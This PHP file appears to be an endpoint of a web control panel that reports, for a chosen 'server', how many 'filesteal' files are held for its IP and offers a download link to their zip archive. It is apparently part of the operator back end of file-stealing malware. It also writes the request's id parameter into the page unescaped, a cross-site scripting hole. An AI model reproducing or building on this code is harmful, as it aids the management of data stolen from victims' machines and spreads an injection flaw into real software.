<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
ini_set('memory_limit', '2048M');
ini_set('max_execution_time', '60');

session_start();
if(!isset($_SESSION['user']['id'])) {
	die();
}
require_once('../../app/Models/includes.php');
if (!User::isAuthentified() || !CSRF::isAjaxRequest() || !Server::ServerExist($_GET['id']))
{
    die("Bad request");
}

$server = Server::GetServer($_GET['id']);

$ip = $server['ip'];
$countfiles = Filesteal::CountFile($server['ip']);

?>
    Number of files : <?= $countfiles ?><br>
<?php if(!in_array("../../data/filesteal/$ip.zip", glob("../../data/filesteal/*.zip"))): ?>
    <i class="ico ico-left fa fa-download"></i> No Archive
<?php else: ?>
    <i class="ico ico-left fa fa-download"></i> <a href="/servers/<?= $_GET['id'] ?>/download">Download Archive</a>
<?php endif; ?>